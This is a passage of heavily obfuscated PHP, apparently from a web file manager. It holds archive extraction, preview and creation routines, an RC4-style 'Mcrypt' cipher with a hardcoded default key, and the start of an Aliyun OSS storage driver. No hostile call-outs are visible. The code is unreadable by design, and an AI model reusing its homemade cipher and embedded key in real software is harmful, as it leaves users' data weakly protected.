$c½¢Œ·©Ã¸[1896]), $c½¢Œ·©Ã¸[1897] => array($c½¢Œ·©Ã¸[1897], $c½¢Œ·©Ã¸[1898], $c½¢Œ·©Ã¸[1041], $c½¢Œ·©Ã¸[1039]), $c½¢Œ·©Ã¸[1043] => array($c½¢Œ·©Ã¸[1043], $c½¢Œ·©Ã¸[1899], $c½¢Œ·©Ã¸[1900], $c½¢Œ·©Ã¸[1901], $c½¢Œ·©Ã¸[1902], $c½¢Œ·©Ã¸[1903], $c½¢Œ·©Ã¸[1904])); goto a‘±ÎƒëÈ¿; C…ƒİ¡Æ´: return $eãĞôåã·; goto Eè·í¨ØéÖ; Eè·í¨ØéÖ: } static function listContent($B¤Ší²ì±ˆ, $DçëÅ‘”ˆ = true) { $C˜ó†¤‰…˜ =& $_SERVER[í…¶]; self::init(); $añòó¯³Ÿ÷ = !empty($GLOBALS[$C˜ó†¤‰…˜[1047]]) ? $GLOBALS[$C˜ó†¤‰…˜[1047]] : get_path_ext($B¤Ší²ì±ˆ); $a’°ñĞÕŠ• = !1; if (self::checkIfType($añòó¯³Ÿ÷, $C˜ó†¤‰…˜[1897])) { $eÂß¹ßáÔ” = PclTarList($B¤Ší²ì±ˆ, $añòó¯³Ÿ÷); $a’°ñĞÕŠ• = array(); for ($C¼ßÚç•—­ = 0; $C¼ßÚç•—­ < count($eÂß¹ßáÔ”); $C¼ßÚç•—­++) { $BßÊß¼‰Ïá = $eÂß¹ßáÔ”[$C¼ßÚç•—­]; if ($BßÊß¼‰Ïá[$C˜ó†¤‰…˜[1912]] == $C˜ó†¤‰…˜[1913] || $BßÊß¼‰Ïá[$C˜ó†¤‰…˜[1912]] == $C˜ó†¤‰…˜[1914]) { continue; } if ($DçëÅ‘”ˆ) { $BßÊß¼‰Ïá[$C˜ó†¤‰…˜[1915]] = ltrim($BßÊß¼‰Ïá[$C˜ó†¤‰…˜[1915]], $C˜ó†¤‰…˜[1153]); } if ($BßÊß¼‰Ïá[$C˜ó†¤‰…˜[1912]] == $C˜ó†¤‰…˜[1916]) { $BßÊß¼‰Ïá[$C˜ó†¤‰…˜[76]] = !0; } else { $BßÊß¼‰Ïá[$C˜ó†¤‰…˜[76]] = !1; } $BßÊß¼‰Ïá[$C˜ó†¤‰…˜[1034]] = $C¼ßÚç•—­; $a’°ñĞÕŠ•[] = $BßÊß¼‰Ïá; } } else { if (self::checkIfType($añòó¯³Ÿ÷, $C˜ó†¤‰…˜[1043])) { $Aæöƒ–É‰² = kodRarArchive::listContent($B¤Ší²ì±ˆ); if (!$Aæöƒ–É‰²[$C˜ó†¤‰…˜[1030]]) { return $Aæöƒ–É‰²; } else { $a’°ñĞÕŠ• = $Aæöƒ–É‰²[$C˜ó†¤‰…˜[1032]]; } } else { if (kodZipArchive::support($C˜ó†¤‰…˜[363])) { $a’°ñĞÕŠ• = kodZipArchive::listContent($B¤Ší²ì±ˆ); } else { $eÂÎè³Æš = new PclZip($B¤Ší²ì±ˆ); $a’°ñĞÕŠ• = $eÂÎè³Æš->listContent(); } } } if ($a’°ñĞÕŠ•) { $AËƒõÆ˜¶ß = unzip_charset_get($a’°ñĞÕŠ•); $DçëÅ‘”ˆ = $DçëÅ‘”ˆ && function_exists($C˜ó†¤‰…˜[65]); for ($C¼ßÚç•—­ = 0; $C¼ßÚç•—­ < count($a’°ñĞÕŠ•); $C¼ßÚç•—­++) { $a’°ñĞÕŠ•[$C¼ßÚç•—­][$C˜ó†¤‰…˜[1915]] = str_replace(array($C˜ó†¤‰…˜[1070], $C˜ó†¤‰…˜[1917]), $C˜ó†¤‰…˜[766], $a’°ñĞÕŠ•[$C¼ßÚç•—­][$C˜ó†¤‰…˜[1915]]); if ($DçëÅ‘”ˆ) { $a’°ñĞÕŠ•[$C¼ßÚç•—­][$C˜ó†¤‰…˜[1915]] = iconv_to($a’°ñĞÕŠ•[$C¼ßÚç•—­][$C˜ó†¤‰…˜[1915]], $AËƒõÆ˜¶ß, $C˜ó†¤‰…˜[326]); unset($a’°ñĞÕŠ•[$C¼ßÚç•—­][$C˜ó†¤‰…˜[1918]]); } } return array($C˜ó†¤‰…˜[1030] => !0, $C˜ó†¤‰…˜[1032] => $a’°ñĞÕŠ•); } else { return array($C˜ó†¤‰…˜[1030] => !1, $C˜ó†¤‰…˜[1032] => $a’°ñĞÕŠ•); } } static function extract($f¦ØêìÃ, $b¼Øßßà°‘, $EíÉèç²ì© = "\55\x31", &$a‚Î¸çèÁ = false) { goto a›³‰õ…ˆë; FÚ±ØÇè±Ë: if (self::checkIfType($DÜîô„Šº°, $a›æŒø…ÃÙ[1897])) { if ($EíÉèç²ì© != $a›æŒø…ÃÙ[1029]) { $fíØÑ™Ô¾ò = unzip_pre_name($fíØÑ™Ô¾ò); $B¬™òƒáò = unzip_pre_name($B¬™òƒáò); $CŞÆğí·· = PclTarExtractList($f¦ØêìÃ, array($fíØÑ™Ô¾ò), $b¼Øßßà°‘, $B¬™òƒáò, $DÜîô„Šº°); } else { $CŞÆğí·· = PclTarExtract($f¦ØêìÃ, $b¼Øßßà°‘, $a›æŒø…ÃÙ[370], $DÜîô„Šº°); } return array($a›æŒø…ÃÙ[1030] => $CŞÆğí··, $a›æŒø…ÃÙ[1032] => PclErrorString(!0)); } else { if (self::checkIfType($DÜîô„Šº°, $a›æŒø…ÃÙ[1043])) { return kodRarArchive::extract($f¦ØêìÃ, $b¼Øßßà°‘, $DÜîô„Šº°, $a‚Î¸çèÁ); } else { if (kodZipArchive::support($a›æŒø…ÃÙ[1919])) { return kodZipArchive::extract($f¦ØêìÃ, $b¼Øßßà°‘, $a‚Î¸çèÁ); } else { $Bò¨Ä Ğ£ = new PclZip($f¦ØêìÃ); if ($EíÉèç²ì© != $a›æŒø…ÃÙ[1029]) { $CŞÆğí·· = $Bò¨Ä Ğ£->extract(PCLZIP_OPT_PATH, $b¼Øßßà°‘, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $a›æŒø…ÃÙ[1920], PCLZIP_OPT_BY_NAME, $a´ƒïğ¬‘ò[$a›æŒø…ÃÙ[1915]], PCLZIP_OPT_REMOVE_PATH, $B¬™òƒáò, PCLZIP_OPT_REPLACE_NEWER); } else { $CŞÆğí·· = $Bò¨Ä Ğ£->extract(PCLZIP_OPT_PATH, $b¼Øßßà°‘, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $a›æŒø…ÃÙ[1920], PCLZIP_OPT_REPLACE_NEWER); } return array($a›æŒø…ÃÙ[1030] => $CŞÆğí··, $a›æŒø…ÃÙ[1032] => $Bò¨Ä Ğ£->errorName(!0)); } } } return array($a›æŒø…ÃÙ[1030] => !1, $a›æŒø…ÃÙ[1032] => $a›æŒø…ÃÙ[1921]); goto CÙ††òÈš; FÍí´µ†’İ: $e±à ´—‹“ = self::listContent($f¦ØêìÃ, !1); if (!$e±à ´—‹“[$a›æŒø…ÃÙ[1030]]) { return $e±à ´—‹“; } if ($EíÉèç²ì© != $a›æŒø…ÃÙ[1029]) { goto aêáÔªÙÚ; A‡Óñ¢ã: if ($GLOBALS[$a›æŒø…ÃÙ[6]][$a›æŒø…ÃÙ[1151]] != $a›æŒø…ÃÙ[326]) { $fíØÑ™Ô¾ò = unzip_pre_name($a‚Î¸çèÁ); } $B¬™òƒáò = get_path_father($a‚Î¸çèÁ); if ($B¬™òƒáò == $a‚Î¸çèÁ) { $B¬™òƒáò = $a›æŒø…ÃÙ[33]; } goto b¨ªßÂÃ‡; aêáÔªÙÚ: $a´ƒïğ¬‘ò = self::fileIndex($e±à ´—‹“[$a›æŒø…ÃÙ[1032]], $EíÉèç²ì©); $a‚Î¸çèÁ = str_replace(array($a›æŒø…ÃÙ[1070], $a›æŒø…ÃÙ[1917]), $a›æŒø…ÃÙ[70], $a´ƒïğ¬‘ò[$a›æŒø…ÃÙ[1915]]); $fíØÑ™Ô¾ò = $a‚Î¸çèÁ; goto A‡Óñ¢ã; b¨ªßÂÃ‡: if ($a´ƒïğ¬‘ò[$a›æŒø…ÃÙ[76]]) { $fíØÑ™Ô¾ò = rtrim($fíØÑ™Ô¾ò, $a›æŒø…ÃÙ[8]) . $a›æŒø…ÃÙ[8]; $a‚Î¸çèÁ = array($a‚Î¸çèÁ); } $FÀ¿ù‚½Æ£ = str_replace($a›æŒø…ÃÙ[93], $a›æŒø…ÃÙ[8], $fíØÑ™Ô¾ò); if (substr($FÀ¿ù‚½Æ£, -1) == $a›æŒø…ÃÙ[8]) { if (!strstr(trim($FÀ¿ù‚½Æ£, $a›æŒø…ÃÙ[8]), $a›æŒø…ÃÙ[8])) { $b¼Øßßà°‘ = $b¼Øßßà°‘ . get_path_this($FÀ¿ù‚½Æ£) . $a›æŒø…ÃÙ[8]; } } else { if ($B¬™òƒáò == $fíØÑ™Ô¾ò) { $B¬™òƒáò = $a›æŒø…ÃÙ[33]; } } goto E«ˆÌİ³ï; E«ˆÌİ³ï: } goto FÚ±ØÇè±Ë; a›³‰õ…ˆë: $a›æŒø…ÃÙ =& $_SERVER[í…¶]; self::init(); $DÜîô„Šº° = !empty($GLOBALS[$a›æŒø…ÃÙ[1047]]) ? $GLOBALS[$a›æŒø…ÃÙ[1047]] : get_path_ext($f¦ØêìÃ); goto FÍí´µ†’İ; CÙ††òÈš: } static function fileIndex($cë—ÜÂØ•¼, $Bì‰ÉâÇŠÖ, $D˜«áŒ¼ù‘ = false) { goto aÍèŠÎÒ …; aÀíñÔÜº: $c®ì›Û‹°› = $Aå¦…ÈŠÁ›; if ($D˜«áŒ¼ù‘) { $c®ì›Û‹°› = $Aå¦…ÈŠÁ›[$D˜«áŒ¼ù‘]; if ($Aå¦…ÈŠÁ›[$DâÚÌÙá¸Â[76]]) { $c®ì›Û‹°› = rtrim($c®ì›Û‹°›, $DâÚÌÙá¸Â[8]) . $DâÚÌÙá¸Â[8]; } } return $c®ì›Û‹°›; goto fÚÂ™êŒæ; eòÏÃå­¢: $Dâ½ùî•¾Ö = count($cë—ÜÂØ•¼); for ($DïÒèËìÅ§ = 0; $DïÒèËìÅ§ < $Dâ½ùî•¾Ö; $DïÒèËìÅ§++) { if ($Bì‰ÉâÇŠÖ == $cë—ÜÂØ•¼[$DïÒèËìÅ§][$DâÚÌÙá¸Â[1034]]) { $Aå¦…ÈŠÁ› = $cë—ÜÂØ•¼[$DïÒèËìÅ§]; break; } } if (!$Aå¦…ÈŠÁ›) { show_tips($DâÚÌÙá¸Â[1922]); } goto aÀíñÔÜº; aÍèŠÎÒ …: $DâÚÌÙá¸Â =& $_SERVER[í…¶]; self::init(); if (!is_array($cë—ÜÂØ•¼)) { return !1; } goto eòÏÃå­¢; fÚÂ™êŒæ: } static function extractZipFile($c¯“¸‚„–‚, $fƒá‚™Ò‰, $DŞ¯Äˆ‰ = false) { goto aÃæÍŸå«¡; fñŠäÜ§É: if (!file_exists($A¢í«¢”·ƒ)) { return !1; } @rename($A¢í«¢”·ƒ, $aˆñ‹¯»‚ã); return $aˆñ‹¯»‚ã; goto c½µ¼‘âÙ; eíïÆ¨Ñ…: $C„öÈ†íĞ‹ = get_path_father($fƒá‚™Ò‰); if ($C„öÈ†íĞ‹ == $fƒá‚™Ò‰) { $C„öÈ†íĞ‹ = $F»ÔÀ­†ê[33]; } $cãÕÀ‡ó¨ = $B°©ª–­»ø->extract(PCLZIP_OPT_PATH, $c¬Óõ²ğÒ¯, PCLZIP_CB_PRE_FILE_NAME, $F»ÔÀ­†ê[1920], PCLZIP_OPT_REMOVE_PATH, $C„öÈ†íĞ‹, PCLZIP_OPT_BY_NAME, $fƒá‚™Ò‰); goto fñŠäÜ§É; CÜ¬ƒÅ„İ¼: if (file_exists($aˆñ‹¯»‚ã)) { return $aˆñ‹¯»‚ã; } $B°©ª–­»ø = new PclZip($c¯“¸‚„–‚); $A¢í«¢”·ƒ = unzip_filter_ext($c¬Óõ²ğÒ¯ . get_path_this($fƒá‚™Ò‰)); goto eíïÆ¨Ñ…; aÃæÍŸå«¡: $F»ÔÀ­†ê =& $_SERVER[í…¶]; self::init(); $c¬Óõ²ğÒ¯ = TEMP_FILES . hash_path($c¯“¸‚„–‚) . $F»ÔÀ­†ê[8]; goto e™îˆ»¡¨â; e™îˆ»¡¨â: mk_dir($c¬Óõ²ğÒ¯); $aˆñ‹¯»‚ã = $c¬Óõ²ğÒ¯ . md5($c¯“¸‚„–‚ . $fƒá‚™Ò‰); if ($DŞ¯Äˆ‰) { $aˆñ‹¯»‚ã = $c¬Óõ²ğÒ¯ . $DŞ¯Äˆ‰; } goto CÜ¬ƒÅ„İ¼; c½µ¼‘âÙ: } static function filePreview($F­İ‡½›Ûâ, $cÉ­òÖ§ßÇ, $F½ŠÖÛÖèÄ = false, $fµ¥¨²¬ = false) { goto C”Œ…Ç·—¼; fĞœğïèƒÈ: $dİƒ¹µÀ¿ = self::extract($F­İ‡½›Ûâ, $BÕ¾ê–Óí¦, $cÉ­òÖ§ßÇ, $C—ª»ø™Â); if (is_array($C—ª»ø™Â)) { show_json($F´·ŠéÓÀ—[1923], !1); } if (file_exists($CƒÙ¬Ü–É)) { IO::fileOut($CƒÙ¬Ü–É, $F½ŠÖÛÖèÄ, get_path_this($C—ª»ø™Â)); return; } goto C£Â«ˆ©; F¾ÖîÈòíñ: mk_dir($BÕ¾ê–Óí¦); $CƒÙ¬Ü–É = $BÕ¾ê–Óí¦ . md5($F­İ‡½›Ûâ . $cÉ­òÖ§ßÇ . $fµ¥¨²¬); $C—ª»ø™Â = $F´·ŠéÓÀ—[33]; goto fĞœğïèƒÈ; Eµ‘àº˜Ùù: if (!file_exists($CƒÙ¬Ü–É)) { del_dir($BÕ¾ê–Óí¦); show_json($F´·ŠéÓÀ—[1925]); } IO::fileOut($CƒÙ¬Ü–É, $F½ŠÖÛÖèÄ, $C†Ø‰õÌ‹); goto EŒæŠÑ×œ¸; C£Â«ˆ©: $C—ª»ø™Â = unzip_pre_name($C—ª»ø™Â); $C†Ø‰õÌ‹ = get_path_this($C—ª»ø™Â); $Fóœé¥´³ = unzip_filter_ext($BÕ¾ê–Óí¦ . $C†Ø‰õÌ‹); goto d¤Š–±êªÆ; d¤Š–±êªÆ: if (!$dİƒ¹µÀ¿[$F´·ŠéÓÀ—[1030]]) { show_json($dİƒ¹µÀ¿[$F´·ŠéÓÀ—[1032]], !1); } if (!file_exists($Fóœé¥´³)) { show_json($F´·ŠéÓÀ—[1924], !1); } @rename($Fóœé¥´³, $CƒÙ¬Ü–É); goto Eµ‘àº˜Ùù; C”Œ…Ç·—¼: $F´·ŠéÓÀ— =& $_SERVER[í…¶]; self::init(); $BÕ¾ê–Óí¦ = TEMP_FILES . hash_path($F­İ‡½›Ûâ) . $F´·ŠéÓÀ—[8]; goto F¾ÖîÈòíñ; EŒæŠÑ×œ¸: } static function create($AëÕïÙöÕÁ, $D¬—‡Ééœ¢) { $Bº‘İªëº¼ =& $_SERVER[í…¶]; self::init(); $EƒãˆİîÇ‡ = get_path_ext($AëÕïÙöÕÁ); $bñ½ÜÔÔæŞ = !1; if (self::checkIfType($EƒãˆİîÇ‡, $Bº‘İªëº¼[301])) { if (kodZipArchive::support($Bº‘İªëº¼[1009])) { return kodZipArchive::create($AëÕïÙöÕÁ, $D¬—‡Ééœ¢); } $d«½Áç…É = new PclZip($AëÕïÙöÕÁ); foreach ($D¬—‡Ééœ¢ as $fÏîÕ¯ù¯÷ => $a¿²†¶Ç²ƒ) { $a¿²†¶Ç²ƒ = str_replace($Bº‘İªëº¼[476], $Bº‘İªëº¼[8], $a¿²†¶Ç²ƒ); $BÌã¸Á§–® = Kodio::clear(get_path_father($a¿²†¶Ç²ƒ)); if ($fÏîÕ¯ù¯÷ == 0) { $bñ½ÜÔÔæŞ = $d«½Áç…É->create($a¿²†¶Ç²ƒ, PCLZIP_OPT_REMOVE_PATH, $BÌã¸Á§–®, PCLZIP_CB_PRE_FILE_NAME, $Bº‘İªëº¼[1926]); continue; } $bñ½ÜÔÔæŞ = $d«½Áç…É->add($a¿²†¶Ç²ƒ, PCLZIP_OPT_REMOVE_PATH, $BÌã¸Á§–®, PCLZIP_CB_PRE_FILE_NAME, $Bº‘İªëº¼[1926]); } } else { if (self::checkIfType($EƒãˆİîÇ‡, $Bº‘İªëº¼[1897])) { foreach ($D¬—‡Ééœ¢ as $fÏîÕ¯ù¯÷ => $a¿²†¶Ç²ƒ) { $a¿²†¶Ç²ƒ = str_replace($Bº‘İªëº¼[476], $Bº‘İªëº¼[8], $a¿²†¶Ç²ƒ); $BÌã¸Á§–® = Kodio::clear(get_path_father($a¿²†¶Ç²ƒ)); if ($fÏîÕ¯ù¯÷ == 0) { $bñ½ÜÔÔæŞ = PclTarCreate($AëÕïÙöÕÁ, array($a¿²†¶Ç²ƒ), $EƒãˆİîÇ‡, null, $BÌã¸Á§–®); continue; } $bñ½ÜÔÔæŞ = PclTarAddList($AëÕïÙöÕÁ, array($a¿²†¶Ç²ƒ), $Bº‘İªëº¼[33], $BÌã¸Á§–®, $EƒãˆİîÇ‡); } } } return $bñ½ÜÔÔæŞ; } } class Mcrypt { public static $defaultKey = "\141\41\x74\141\153\x41\x3a\x64\154\155\143\x6c\x64\x45\166\54\145"; public static function encode($E¤•…»”æá, $E›ƒÈ¡ä÷Œ = '', $fŞ§ù‰Õ…Ê = 0, $D¬’«ãĞË¨ = '') { goto eéÑòÈğö§; AŠØ„ÔòÖ: $FäÅ‹„Ã = substr($D¬’«ãĞË¨, -$cĞµÑŠĞç­); $fµ™ù¶„ùÚ = $cïÎ¹ì£’Æ . md5($cïÎ¹ì£’Æ . $FäÅ‹„Ã); $eÓî¾Îƒ†¼ = strlen($fµ™ù¶„ùÚ); goto C¦»ÎÁ¨¥Ò; eéÑòÈğö§: $e¨ªÌÎ´ÊÚ =& $_SERVER[í…¶]; $cĞµÑŠĞç­ = 4; $E›ƒÈ¡ä÷Œ = md5($E›ƒÈ¡ä÷Œ ? $E›ƒÈ¡ä÷Œ : self::$defaultKey); goto fÔ‚±ß‰È£; C¦»ÎÁ¨¥Ò: $E¤•…»”æá = sprintf($e¨ªÌÎ´ÊÚ[1927], $fŞ§ù‰Õ…Ê ? $fŞ§ù‰Õ…Ê + time() : 0) . substr(md5($E¤•…»”æá . $DµÏˆô„•Æ), 0, 16) . $E¤•…»”æá; $D–Õ®Œê¹ß = strlen($E¤•…»”æá); $DŒŒÎè¯¢Õ = array(); goto C˜ï¨„Ø‚ã; fÔ‚±ß‰È£: $cïÎ¹ì£’Æ = md5(substr($E›ƒÈ¡ä÷Œ, 0, 16)); $DµÏˆô„•Æ = md5(substr($E›ƒÈ¡ä÷Œ, 16, 16)); $D¬’«ãĞË¨ = $D¬’«ãĞË¨ ? $D¬’«ãĞË¨ : md5(microtime()); goto AŠØ„ÔòÖ; cÆçªÂã: $Bâ†í…Ş‰ = str_replace(array($e¨ªÌÎ´ÊÚ[284], $e¨ªÌÎ´ÊÚ[8], $e¨ªÌÎ´ÊÚ[905]), array($e¨ªÌÎ´ÊÚ[421], $e¨ªÌÎ´ÊÚ[70], $e¨ªÌÎ´ÊÚ[91]), $Bâ†í…Ş‰); return $Bâ†í…Ş‰; goto BíŠ¨ğøƒ·; b—Ø¬·ÔÑØ: $Bâ†í…Ş‰ = $e¨ªÌÎ´ÊÚ[33]; for ($AÉ±äÉÊ = $d°À³×‚ = $CÀ’øÓº = 0; $CÀ’øÓº < $D–Õ®Œê¹ß; $CÀ’øÓº++) { $AÉ±äÉÊ = ($AÉ±äÉÊ + 1) % 256; $d°À³×‚ = ($d°À³×‚ + $BÙ–Î¯¨°[$AÉ±äÉÊ]) % 256; $dÓ‹—¸ÚŞë = $BÙ–Î¯¨°[$AÉ±äÉÊ]; $BÙ–Î¯¨°[$AÉ±äÉÊ] = $BÙ–Î¯¨°[$d°À³×‚]; $BÙ–Î¯¨°[$d°À³×‚] = $dÓ‹—¸ÚŞë; $Bâ†í…Ş‰ .= chr(ord($E¤•…»”æá[$CÀ’øÓº]) ^ $BÙ–Î¯¨°[($BÙ–Î¯¨°[$AÉ±äÉÊ] + $BÙ–Î¯¨°[$d°À³×‚]) % 256]); } $Bâ†í…Ş‰ = $FäÅ‹„Ã . str_replace($e¨ªÌÎ´ÊÚ[905], $e¨ªÌÎ´ÊÚ[33], base64_encode($Bâ†í…Ş‰)); goto cÆçªÂã; C˜ï¨„Ø‚ã: for ($CÀ’øÓº = 0; $CÀ’øÓº <= 255; $CÀ’øÓº++) { $DŒŒÎè¯¢Õ[$CÀ’øÓº] = ord($fµ™ù¶„ùÚ[$CÀ’øÓº % $eÓî¾Îƒ†¼]); } $BÙ–Î¯¨° = range(0, 255); for ($d°À³×‚ = $CÀ’øÓº = 0; $CÀ’øÓº < 256; $CÀ’øÓº++) { $d°À³×‚ = ($d°À³×‚ + $BÙ–Î¯¨°[$CÀ’øÓº] + $DŒŒÎè¯¢Õ[$CÀ’øÓº]) % 256; $dÓ‹—¸ÚŞë = $BÙ–Î¯¨°[$CÀ’øÓº]; $BÙ–Î¯¨°[$CÀ’øÓº] = $BÙ–Î¯¨°[$d°À³×‚]; $BÙ–Î¯¨°[$d°À³×‚] = $dÓ‹—¸ÚŞë; } goto b—Ø¬·ÔÑØ; BíŠ¨ğøƒ·: } public static function decode($C‡¥“©ÎŸî, $Eá¹»Ì‘Û = '') { goto F‘‡ÍÔø¸´; eÑ¶ĞèäĞ”: if (($C±´¹÷áÖ == 0 || $C±´¹÷áÖ - time() > 0) && substr($EØã»À¯£İ, 10, 16) == substr(md5(substr($EØã»À¯£İ, 26) . $dŠÁÛìáê½), 0, 16)) { return substr($EØã»À¯£İ, 26); } else { return $aáêÀÍòœ¦[33]; } goto B©ÛĞùÁÖ; F‘‡ÍÔø¸´: $aáêÀÍòœ¦ =& $_SERVER[í…¶]; $C‡¥“©ÎŸî = str_replace(array($aáêÀÍòœ¦[421], $aáêÀÍòœ¦[70], $aáêÀÍòœ¦[91]), array($aáêÀÍòœ¦[284], $aáêÀÍòœ¦[8], $aáêÀÍòœ¦[905]), $C‡¥“©ÎŸî); $d´Ğò×†­ = 4; goto c¯ë¤Å¾«; AïÃÚ–…ôã: for ($c©ğ¸—Ñ¸ê = 0; $c©ğ¸—Ñ¸ê <= 255; $c©ğ¸—Ñ¸ê++) { $C’Ç£ø†á¿[$c©ğ¸—Ñ¸ê] = ord($Eº£èÁœ‘´[$c©ğ¸—Ñ¸ê % $BîŸŠ÷æ„©]); } $d™³Øõ‹ = range(0, 255); for ($cŒ’™ÍÙö = $c©ğ¸—Ñ¸ê = 0; $c©ğ¸—Ñ¸ê < 256; $c©ğ¸—Ñ¸ê++) { $cŒ’™ÍÙö = ($cŒ’™ÍÙö + $d™³Øõ‹[$c©ğ¸—Ñ¸ê] + $C’Ç£ø†á¿[$c©ğ¸—Ñ¸ê]) % 256; $EÏŠİ¬À = $d™³Øõ‹[$c©ğ¸—Ñ¸ê]; $d™³Øõ‹[$c©ğ¸—Ñ¸ê] = $d™³Øõ‹[$cŒ’™ÍÙö]; $d™³Øõ‹[$cŒ’™ÍÙö] = $EÏŠİ¬À; } goto BíÌÁ²™‚§; BíÌÁ²™‚§: $EØã»À¯£İ = $aáêÀÍòœ¦[33]; for ($BÆšù¼—†œ = $cŒ’™ÍÙö = $c©ğ¸—Ñ¸ê = 0; $c©ğ¸—Ñ¸ê < $B¬ªà„Ğ; $c©ğ¸—Ñ¸ê++) { $BÆšù¼—†œ = ($BÆšù¼—†œ + 1) % 256; $cŒ’™ÍÙö = ($cŒ’™ÍÙö + $d™³Øõ‹[$BÆšù¼—†œ]) % 256; $EÏŠİ¬À = $d™³Øõ‹[$BÆšù¼—†œ]; $d™³Øõ‹[$BÆšù¼—†œ] = $d™³Øõ‹[$cŒ’™ÍÙö]; $d™³Øõ‹[$cŒ’™ÍÙö] = $EÏŠİ¬À; $EØã»À¯£İ .= chr(ord($C‡¥“©ÎŸî[$c©ğ¸—Ñ¸ê]) ^ $d™³Øõ‹[($d™³Øõ‹[$BÆšù¼—†œ] + $d™³Øõ‹[$cŒ’™ÍÙö]) % 256]); } $C±´¹÷áÖ = intval(substr($EØã»À¯£İ, 0, 10)); goto eÑ¶ĞèäĞ”; c¯ë¤Å¾«: $Eá¹»Ì‘Û = md5($Eá¹»Ì‘Û ? $Eá¹»Ì‘Û : self::$defaultKey); $Fù­„éá–ª = md5(substr($Eá¹»Ì‘Û, 0, 16)); $dŠÁÛìáê½ = md5(substr($Eá¹»Ì‘Û, 16, 16)); goto A½ŸÄ”®Ãé; fÖƒòöİ£¨: $C‡¥“©ÎŸî = base64_decode(substr($C‡¥“©ÎŸî, $d´Ğò×†­)); $B¬ªà„Ğ = strlen($C‡¥“©ÎŸî); $C’Ç£ø†á¿ = array(); goto AïÃÚ–…ôã; A½ŸÄ”®Ãé: $bÍŞƒöª¼¤ = substr($C‡¥“©ÎŸî, 0, $d´Ğò×†­); $Eº£èÁœ‘´ = $Fù­„éá–ª . md5($Fù­„éá–ª . $bÍŞƒöª¼¤); $BîŸŠ÷æ„© = strlen($Eº£èÁœ‘´); goto fÖƒòöİ£¨; B©ÛĞùÁÖ: } } define($_SERVER[í…¶][1928], 1); goto f†Øâ——­©; a‡ÙæâÖ¬§: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($C÷ô›¬Š) { parent::__construct(); include_once SDK_DIR . $_SERVER[í…¶][1169]; $this->_init($C÷ô›¬Š); } public function _init($dšËí±Œ§) { foreach ($dšËí±Œ§ as $E©ØÌÛõÄ£ => $D¡Û¾ˆŞ¼×) { if (isset($this->{$E©ØÌÛõÄ£})) { $this->{$E©ØÌÛõÄ£} = $D¡Û¾ˆŞ¼×; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[í…¶][1170], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto d…¦–‰™ó™; aÊ£Â§ Ñ: $C¨Ó•“†›‰->addRule($B‚å–ßĞ £); try { $this->client->putBucketCors($this->bucket, $C¨Ó•“†›‰); } catch (OSS\Core\OssException $f’õÒõ–èƒ) { return !1; } return !0; goto b³Â½„¢ñ; f¥öÂğÃŒö: $B‚å–ßĞ £->setMaxAgeSeconds(600); $B‚å–ßĞ £->addExposeHeader($eï‹˜ŞĞ˜[1176]); $B‚å–ßĞ £->addAllowedHeader($eï‹˜ŞĞ˜[1171]); goto aÊ£Â§ Ñ; d…¦–‰™ó™: $eï‹˜ŞĞ˜ =& $_SERVER[í…¶]; $C¨Ó•“†›‰ = new OSS\Model\CorsConfig(); $B‚å–ßĞ £ = new OSS\Model\CorsRule(); goto aÏ¢Ùğì¨“; D˜ïšš…â©: $B‚å–ßĞ £->addAllowedMethod($eï‹˜ŞĞ˜[1174]); $B‚å–ßĞ £->addAllowedMethod($eï‹˜ŞĞ˜[1175]); $B‚å–ßĞ £->addAllowedMethod($eï‹˜ŞĞ˜[155]); goto f¥öÂğÃŒö; aÏ¢Ùğì¨“: $B‚å–ßĞ £->addAllowedOrigin($eï‹˜ŞĞ˜[1171]); $B‚å–ßĞ £->addAllowedMethod($eï‹˜ŞĞ˜[1172]); $B‚å–ßĞ £->addAllowedMethod($eï‹˜ŞĞ˜[1173]); goto D˜ïšš…â©; b³Â½„¢ñ: } public function getBucketCors() { goto fŞ„Ú‰Û÷; fŞ„Ú‰Û÷: $Bì¯àã‡Ù¡ =& $_SERVER[í…¶]; $cšÂºâˆ°» = null; try { $cšÂºâˆ°» = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Aéç‘ÄÄòŠ) { return null; } goto eÛË‚ºªƒ‡; cˆá­‰¾³ê: $EÕíáµ‰¦ = $Eª·Óæ•‹ß[0]->getMaxAgeSeconds(); $AŠÁÉ½‡Àê = $Eª·Óæ•‹ß[0]->getExposeHeaders(); $AÄÉï¹çë = $Eª·Óæ•‹ß[0]->getAllowedHeaders(); goto CÂ—­Ñƒº; CÂ—­Ñƒº: return array($Bì¯àã‡Ù¡[175] => isset($fŸß±õöœç[0]) ? $fŸß±õöœç[0] : $Bì¯àã‡Ù¡[33], $Bì¯àã‡Ù¡[179] => $e²×²–Ôåî, $Bì¯àã‡Ù¡[1177] => $EÕíáµ‰¦, $Bì¯àã‡Ù¡[1178] => isset($AŠÁÉ½‡Àê[0]) ? $AŠÁÉ½‡Àê[0] : $Bì¯àã‡Ù¡[33], $Bì¯àã‡Ù¡[177] => isset($AÄÉï¹çë[0]) ? $AÄÉï¹çë[0] : $Bì¯àã‡Ù¡[33]); goto EàÁŸ‘“¬¤; eÛË‚ºªƒ‡: if (!$cšÂºâˆ°» || !($Eª·Óæ•‹ß = $cšÂºâˆ°»->getRules())) { return null; } $fŸß±õöœç = $Eª·Óæ•‹ß[0]->getAllowedOrigins(); $e²×²–Ôåî = $Eª·Óæ•‹ß[0]->getAllowedMethods(); goto cˆá­‰¾³ê; EàÁŸ‘“¬¤: } public function isBucketCors() { goto bœéˆÖ©Ã; f¯¹¨°İù×: $a×Çè£¹ö† = array($B½Øâ°¨è[180], $B½Øâ°¨è[181], $B½Øâ°¨è[182], $B½Øâ°¨è[183], $B½Øâ°¨è[184]); $BÛ“à¼¾Ãá = array_diff($a×Çè£¹ö†, $bÃªé½‰…Ğ); return empty($BÛ“à¼¾Ãá); goto BñÇÑ“ó; bœéˆÖ©Ã: 